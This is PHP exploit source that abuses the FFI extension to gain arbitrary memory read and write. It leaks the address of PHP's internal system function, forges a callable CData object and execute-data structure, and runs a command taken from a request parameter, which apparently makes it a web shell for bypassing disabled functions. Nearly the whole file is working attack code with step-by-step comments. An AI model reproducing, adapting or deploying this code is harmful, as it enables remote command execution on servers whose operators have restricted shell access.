function pwn($cmd) {
    function allocate($amt, $fill) {
        // could do $persistent = TRUE to alloc on libc malloc heap instead
        // but we already have a good read/write primitive
        // and relying on libc leaks for gadgets is not very portable
        // (custome compiled libc -> see pornhub php 0-day)
        $buf = FFI::new("char [".$amt."]");
        $bufPtr = FFI::addr($buf);
        FFI::memset($bufPtr, $fill, $amt);
        // not sure if i need to keep the CData reference alive
        // or not - but just in case return it too for now
        return array($bufPtr, $buf);
    }
    
    // uses leak to leak data from FFI ptr
    function leak($ptr, $n, $hex) {
        if ( $hex == 0 ) {
            return FFI::string($ptr, $n);
        } else {
            return bin2hex(FFI::string($ptr, $n));
        }
    }
    
    function ptrVal($ptr) {
        $tmp = FFI::cast("uint64_t", $ptr);
        return $tmp->cdata;
    }
    
    /* Read primative
    writes target address overtop of CDATA object pointer, 
    then leaks directly from the CDATA object
    */
    function Read($addr, $n = 8, $hex = 0) {
        // Create vulnBuf which we walk back to do the overwrite
        // (the size and contents dont really matter)
        list($vulnBufPtr, $vulnBuf) = allocate(1, 0x42); // B*8
        // walk back to get ptr to ptr (heap)
        $vulnBufPtrPtr = FFI::addr($vulnBufPtr);
        /*// DEBUG
        $vulnBufPtrVal = ptrVal($vulnBufPtr);
        $vulnBufPtrPtrVal = ptrVal($vulnBufPtrPtr);
        printf("vuln BufPtr =  %s\n", dechex($vulnBufPtrVal));
        printf("vuln BufPtrPtr =  %s\n", dechex($vulnBufPtrPtrVal));
        printf("-------\n\n");
        */
    
        // Overwrite the ptr
        $packedAddr = pack("Q",$addr);
        FFI::memcpy($vulnBufPtrPtr, $packedAddr, 8);
    
        // Leak the overwritten ptr
        return leak($vulnBufPtr, $n, $hex);
    }
    
    /* Write primative
    writes target address overtop of CDATA object pointer, 
    then writes directly to the CDATA object
    */
    function Write($addr, $what, $n) {
        // Create vulnBuf which we walk back to do the overwrite
        // (the size and contents dont really matter)
        list($vulnBufPtr, $vulnBuf) = allocate(1, 0x42); // B*8
        // walk back to get ptr to ptr (heap)
        $vulnBufPtrPtr = FFI::addr($vulnBufPtr);
        /*// DEBUG
        $vulnBufPtrVal = ptrVal($vulnBufPtr);
        $vulnBufPtrPtrVal = ptrVal($vulnBufPtrPtr);
        printf("vuln BufPtr =  %s\n", dechex($vulnBufPtrVal));
        printf("vuln BufPtrPtr =  %s\n", dechex($vulnBufPtrPtrVal));
        printf("-------\n\n");
        */
    
        // Overwrite the ptr
        $packedAddr = pack("Q",$addr);
        FFI::memcpy($vulnBufPtrPtr, $packedAddr, 8);
    
        // Write to the overwritten ptr
        FFI::memcpy($vulnBufPtr, $what, $n);
    }
    
    function isPtr($knownPtr, $testPtr) {
        if ( ($knownPtr & 0xFFFFFFFF00000000) == ($testPtr & 0xFFFFFFFF00000000)) {
            return 1;
        } else {
            return 0;
        }
    }
    
    /* Walks looking for valid pointers
    * - each valid ptr is read and if it 
    -  points to the target return the address of the
    -  ptr and the location it was found
    */
    //function getRodataAddr($bssLeak) {
    function walkSearch($segmentLeak, $maxQWORDS, $target, $size = 8, $up = 0) {
        $start = $segmentLeak;
        for($i = 0; $i < $maxQWORDS; $i++) {
            if ( $up == 0 ) { // walk 'down' addresses
                $addr = $start - (8 * $i);
            } else { // walk 'up' addresses
                $addr = $start + (8 * $i);
            }
            //$leak = Read($addr, 8);
            $leak = unpack("Q", Read($addr))[1];
            
            // skip if its not a valid pointer...
            if ( isPtr($segmentLeak, $leak) == 0 ) {
                continue;
            }
            $leak2 = Read($leak, $n = $size);
            //printf("0x%x->0x%x = %s\n", $addr, $leak, $leak2);
            if( strcmp($leak2, $target) == 0 ) { # match
                return array ($leak, $addr);
            }
        }
        return array(0, 0);
    }

    function getBinaryBase($textLeak) {
        $start = $textLeak & 0xfffffffffffff000;
        for($i = 0; $i < 0x10000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = Read($addr, 7);
            //if($leak == 0x10102464c457f) { # ELF header
            if( strcmp($leak, "\x7f\x45\x4c\x46\x02\x01\x01") == 0 ) { # ELF header
                return $addr;
            }
        }
        return 0;
    }
 
    function parseElf($base) {
        $e_type = unpack("S", Read($base + 0x10, 2))[1];

        $e_phoff = unpack("Q", Read($base + 0x20))[1];
        $e_phentsize = unpack("S", Read($base + 0x36, 2))[1];
        $e_phnum = unpack("S", Read($base + 0x38, 2))[1];

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = unpack("L", Read($header, 4))[1];
            $p_flags = unpack("L", Read($header + 4, 4))[1];
            $p_vaddr = unpack("Q", Read($header + 0x10))[1];
            $p_memsz = unpack("Q", Read($header + 0x28))[1];

            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function getBasicFuncs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = unpack("Q", Read($data_addr+ ($i * 8)))[1];
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = unpack("Q", Read($leak))[1];
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;
            $leak = unpack("Q", Read($data_addr + (($i + 4) * 8)))[1];
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = unpack("Q", Read($leak))[1];
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;
            return $data_addr + $i * 8;
        }
    }

    function getSystem($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = unpack("Q", Read($addr))[1];
            $f_name = Read($f_entry, 6) . "\0";

            if( strcmp($f_name, "system\0") == 0) { # system
                return unpack("Q", Read($addr + 8))[1];
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }
    // Convenient for debugging
    function crash() {
        Write(0x0, "AAAA", 4);
    }
    
    
    printf("\n[+] Starting exploit...\n");
    // --------------------------- start of leak zif_system address
    /* NOTE: typically we would leak a .text address and
      walk backwards to find the ELF header. From there we can parse
      the elf information to resolve zif_system - in our case the
      base PHP binary image with the ELF head is on its own mapping
      that does not border the .text segment. So we need a creative 
      way to get zif_system
    */
    /* ---- First, we use our read to walk back to the our Zend_object,
    //   and get its zend_object_handlers* which will point to the
    //   php binary symbols zend_ffi_cdata_handlers in the .bss.
    //
    //_zend_ffi_cdata.ptr-holder - _zend_ffi_cdata.ptr.std.handlers == 6 QWORDS
    //
    //   From there we search for a ptr to a known value (happens to be to the .rodata section)
    //   that just so happens to sit right below a ptr to the 'zend_version' relro entry.
    //   So we do some checks on that to confirm it is infact a valid ptr to the .data.relro.
    //
    //   Finally we walk UP the relro entries looking for the 'system' (zif_system) entry.
    
    (zend_types.h)
    struct _zend_object { <-----typdef zend_object
        zend_refcounted_h gc;
        uint32_t          handle; // may be removed ???
        end_class_entry *ce;
        const zend_object_handlers *handlers; <--- func ptrs
        HashTable        *properties;
        zval              properties_table[1];
    };
    (ffi.c)
    typedef struct _zend_ffi_cdata {
        zend_object            std;
        zend_ffi_type         *type;
        void                  *ptr; <--- OVERWRITE
        void                  *ptr_holder; <--
        zend_ffi_flags         flags;
    } zend_ffi_cdata;
    
    */ 
    
    list($dummyPtr, $dummy) = allocate(64, 0x41);
    // dummy buf ptr
    $dummyPtrVal = ptrVal($dummyPtr);
    
    // dummy buf ptr ptr
    $dummyPtrPtr = FFI::addr($dummyPtr);
    $dummyPtrPtrVal = ptrVal($dummyPtrPtr);
    
    printf("Dummy BufPtr =  0x%x\n", $dummyPtrVal);
    printf("Dummy BufPtrPtr = 0x%x\n", $dummyPtrPtrVal);
    $r = leak($dummyPtr, 64, 1);
    printf("Dummy buf:\n%s\n", $r);
    printf("-------\n\n");
    
    /*
    // ------ Test our read and write 
    $r = Read($dummyPtrVal, 256, 1);
    printf("Read Test (DummyBuf):\n%s\n", $r);
    
    Write($dummyPtrVal, "CCCCCCCC", 8);
    $r = Read($dummyPtrVal, 256, 1);
    printf("Write Test (DummyBuf):\n%s\n", $r);
    // ----------
    */
    
    $handlersPtrPtr = $dummyPtrPtrVal - (6 * 8);
    printf("_zend_ffi_cdata.ptr.std.handlers = 0x%x\n", $handlersPtrPtr);
    
    $handlersPtr = unpack("Q", Read($handlersPtrPtr))[1]; // --> zend_ffi_cdata_handlers -> .bss
    printf("zend_ffi_cdata_handlers = 0x%x\n", $handlersPtr);
    
    // Find our 'known' value in the .rodata section -- in this case 'CORE'
    // (backup can be 'STDIO)'
    list($rodataLeak, $rodataLeakPtr) = walkSearch($handlersPtr, 0x400,"Core", $size=4);
    if ( $rodataLeak == 0 ) {
        // If we failed let's just try to find PHP's base and hope for the best
        printf("Get rodata addr failed...trying for last ditch effort at PHP's ELF base\n");
        // use .txt leak
        $textLeak = unpack("Q", Read($handlersPtr+16))[1]; // zned_objects_destroy_object
        printf(".textLeak = 0x%x\n", $textLeak);
        $base = getBinaryBase($textLeak);
        if ( $base == 0 ) {
            die("Failed to get binary base\n");
        }
        printf("BinaryBase = 0x%x\n", $base);
        // parse elf
        if (!($elf = parseElf($base))) {
            die("failed to parseElf\n");
        }
        if (!($basicFuncs = getBasicFuncs($base, $elf))) {
            die("failed to get basic funcs\n");
        }
        if (!($zif_system = getSystem($basicFuncs))) {
            die("Failed to get system\n");
        }
        // XXX HERE XXX
        //die("Get rodata addr failed\n");
    } else {
        printf(".rodata leak ('CORE' ptr) = 0x%x->0x%x\n", $rodataLeakPtr, $rodataLeak);
    
        // Right after the "Core" ptrptr is zend_version's relro entry - XXX this may not be static
        // zend_version is in .data.rel.ro
        $dataRelroPtr = $rodataLeakPtr + 8;
        printf("PtrPtr to 'zend_verson' relro entry: 0x%x\n", $dataRelroPtr);
        
        // Read the .data.relro potr
        $dataRelroLeak = unpack("Q", Read($dataRelroPtr))[1];
        if ( isPtr($dataRelroPtr, $dataRelroLeak) == 0 ) {
            die("bad zend_version entry pointer\n");
        }
        printf("Ptr to 'zend_verson' relro entry: 0x%x\n", $dataRelroLeak);
        
        // Confirm this is a ptrptr to zend_version
        $r = unpack("Q", Read($dataRelroLeak))[1];
        if ( isPtr($dataRelroLeak, $r) == 0 ) {
            die("bad zend_version entry pointer\n");
        }
        
        printf("'zend_version' string ptr = 0x%x\n", $r);
        
        $r = Read($r, $n = 12);
        if ( strcmp($r, "zend_version") ) {
            die("Failed to find zend_version\n");
        }
        printf("[+] Verified data.rel.ro leak @ 0x%x!\n", $dataRelroLeak);
        
        
        /* Walk FORWARD the .data.rel.ro segment looking for the zif_system entry
          - this is a LARGE section...
        */
        list($systemStrPtr, $systemEntryPtr) = walkSearch($dataRelroLeak, 0x3000, "system", $size = 6, $up =1);
        if ( $systemEntryPtr == 0 ) {
            die("Failed to find zif_system relro entry\n");
        }
        printf("system relro entry = 0x%x\n", $systemEntryPtr);
        $zif_systemPtr = $systemEntryPtr + 8;
        $r = unpack("Q", Read($zif_systemPtr))[1];
        if ( isPtr($zif_systemPtr, $r) == 0 ) {
            die("bad zif_system pointer\n");
        }
        $zif_system = $r;
    }
    printf("[+] zif_system @ 0x%x\n", $zif_system);
    
    // --------------------------- end of leak zif_system address
    // --------------------------- start call zif_system
    
    
    /* To call system in a controlled manner
       the easiest way is to create cdata object, write target RIP (zif_system's address) to it
       and finally modify it's zend_ffi_type_kind to ZEND_FFI_TYPE_FUNC to call it
    */
    $helper = FFI::new("char* (*)(const char *)");
    //$helper = FFI::new("char* (*)(const char *, int )"); // XXX if we want return_val control
    $helperPtr = FFI::addr($helper);
    
    //list($helperPtr, $helper) = allocate(8, 0x43);
    //$x[0] = $zif_system;
    $helperPtrVal = ptrVal($helperPtr);
    $helperPtrPtr = FFI::addr($helperPtr);
    $helperPtrPtrVal = ptrVal($helperPtrPtr);
    printf("helper.ptr_holder @ 0x%x -> 0x%x\n", $helperPtrPtrVal, $helperPtrVal);
    
    // Walk the type pointers
    //$helperObjPtr = $helperPtrPtrVal - (9 *8); // to top of cdata object
    //printf("helper CDATA object @ 0x%x\n", $helperObjPtr);
    $helperTypePtrPtr = $helperPtrPtrVal - (2 *8); // 2 DWORDS up the struct to *type ptr
    //printf("helper CDATA type PtrPtr @ 0x%x\n", $helperTypePtrPtr);
    $r = unpack("Q", Read($helperTypePtrPtr))[1];
    if ( isPtr($helperTypePtrPtr, $r) == 0 ) {
        die("bad helper type  pointer\n");
    }
    $helperTypePtr = $r;
    
    // Confirm it's currently ZEND_FFI_TYPE_VOID (0)
    $r = Read($helperTypePtr, $n=1, $hex=1);
    if ( strcmp($r, "00") ) {
        die("Unexpected helper type!\n");
    }
    
    printf("Current helper CDATA type @ 0x%x -> 0x%x -> ZEND_FFI_TYPE_VOID (0)\n", $helperTypePtrPtr, $helperTypePtr);
    
    // Set it to ZEND_FFI_TYPE_FUNC (16 w/ HAVE_LONG_DOUBLE else 15)
    Write($helperTypePtr, "\x10", 1);
    
    printf("Swapped helper CDATA type @ 0x%x -> 0x%x -> ZEND_FFI_TYPE_FUNC (16)\n", $helperTypePtrPtr, $helperTypePtr);
    
    // Finally write zif_system to the value
    Write($helperPtrVal, pack("Q", $zif_system), 8);
    
    // --------------------------- end of leak zif_system address
    // ----------------------- start of build zif_system argument
    /*
        zif_system takes 2 args -> zif_system(*zend_execute_data, return_val)
        For now I don't bother with the return_val, although tehnically we could control
        it and potentially exit cleanly
    */
    
    // ----------- start of setup zend_execute_data object
    
    /* Build valid zend_execute object
    struct _zend_execute_data {
        const zend_op       *opline;           /* executed opline                
        zend_execute_data   *call;             /* current call                   
        zval                *return_value;
        zend_function       *func;             /* executed function              
        zval                 This;             /* this + call_info + num_args 
        zend_execute_data   *prev_execute_data;
        zend_array          *symbol_table;
        void               **run_time_cache;   /* cache op_array->run_time_cache 
    }; //0x48 bytes
    */
    
    //This.u2.num_args MUST == our number of args (1 or 2 apparantly..) [6 QWORD in execute_data] 
    $execute_data = str_shuffle(str_repeat("C", 5*8)); // 0x28 C's
    $execute_data .= pack("L", 0); // this.u1.type
    $execute_data .= pack("L", 1); // this.u2.num_args
    $execute_data .= str_shuffle(str_repeat("A", 0x18)); // fill out rest of zend_execute obj
    $execute_data .= str_shuffle(str_repeat("D", 8)); //padding
    
    // ----------- end of setup zend_execute_data object
    // ----------- start of setup argument object
    /* the ARG (zval) object lays after the execute_data object
    
    zval {
        value = *cmdStr ([16 bytes] + [QWORD string size] + [NULL terminated string])
        u1.type = 6 (IS_STRING)
        u2.???? = [unused]
    }
    */
    
    /*
    //  Let's get our target command setup in a controlled buffer
    //   TODO - use the dummy buf?
    // the string itself is odd. it has 16 bytes prepended to it that idk what it is
    // the whole argument after the zend_execute_data object looks like
    */
    
    $cmd_ = str_repeat("X", 16); // unk padding
    $cmd_ .= pack("Q", strlen($cmd)); // string len
    $cmd_ .= $cmd . "\0"; // ensure null terminated!
    list($cmdBufPtr, $cmdBuf) = allocate(strlen($cmd_), 0);
    $cmdBufPtrVal = ptrVal($cmdBufPtr);
    FFI::memcpy($cmdBufPtr, $cmd_, strlen($cmd_));
    printf("cmdBuf Ptr = 0x%x\n", $cmdBufPtrVal);
    
    // Now setup the zval object itself
    $zval = pack("Q", $cmdBufPtrVal); // zval.value (pointer to cmd string)
    $zval .= pack("L", 6); // zval.u1.type (IS_STRING [6])
    $zval .= pack("L", 0); // zval.u2 - unused
    
    $execute_data .= $zval;
    
    // ---------- end of setup argument object
    // ----------------------- start of build zif_system argument
    $res = $helper($execute_data);
    //$return_val = 0x0; // // XXX if we want return_val control
    //$res = $helper($execute_data, $return_val); // XXX if we want return_val control
    // --------------------------- end of call zif_system
}
pwn(get("cmd"));